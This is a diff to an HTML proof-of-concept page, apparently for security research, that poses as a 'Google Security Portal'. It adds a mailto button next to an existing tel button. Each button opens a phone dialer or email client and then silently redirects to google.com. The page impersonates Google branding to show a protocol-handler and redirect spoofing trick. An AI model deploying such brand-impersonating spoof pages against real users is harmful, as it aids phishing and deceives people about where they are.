@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Tel & Redirect PoC</title>
+    <title>Protocol Tel, Mailto & Redirect PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -30,8 +30,15 @@
             color: #1a73e8;
             margin-bottom: 24px;
         }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            max-width: 340px;
+        }
         a.spoof-link {
-            display: inline-block;
+            display: block;
             background-color: #1a73e8;
             color: white;
             padding: 14px 28px;
@@ -42,6 +49,7 @@
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
             cursor: pointer;
+            box-sizing: border-box;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -58,28 +66,41 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Verification System</h1>
 
-    <!-- Target Link -->
-    <a class="spoof-link" id="targetLink">Open Phone Dialer & Redirect to Google</a>
+    <!-- Container untuk Tombol-tombol -->
+    <div class="button-container">
+        <!-- Target Link 1: Tel -->
+        <a class="spoof-link" id="targetLinkTel">Open Phone Dialer & Redirect</a>
+
+        <!-- Target Link 2: Mailto -->
+        <a class="spoof-link" id="targetLinkMail">Open Email Client & Redirect</a>
+    </div>
 
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        const targetElement = document.getElementById("targetLink");
-
-        const triggerAction = (e) => {
+        // Logika untuk Tombol Tel
+        const telElement = document.getElementById("targetLinkTel");
+        const triggerTelAction = (e) => {
             e.preventDefault();
-            
-            // 1. Memicu protokol tel: via window.location
             window.location.href = "tel:+18005550199";
-
-            // 2. Redirect ke google.com setelah jeda singkat
             setTimeout(() => {
                 window.location.href = "https://google.com";
             }, 600);
         };
+        telElement.addEventListener("click", triggerTelAction);
+        telElement.addEventListener("touchstart", triggerTelAction, { passive: false });
 
-        targetElement.addEventListener("click", triggerAction);
-        targetElement.addEventListener("touchstart", triggerAction, { passive: false });
+        // Logika untuk Tombol Mailto
+        const mailElement = document.getElementById("targetLinkMail");
+        const triggerMailAction = (e) => {
+            e.preventDefault();
+            window.location.href = "mailto:security@google.com?subject=Verification&body=Please%20verify%20my%20account";
+            setTimeout(() => {
+                window.location.href = "https://google.com";
+            }, 600);
+        };
+        mailElement.addEventListener("click", triggerMailAction);
+        mailElement.addEventListener("touchstart", triggerMailAction, { passive: false });
     </script>
 
 </body>
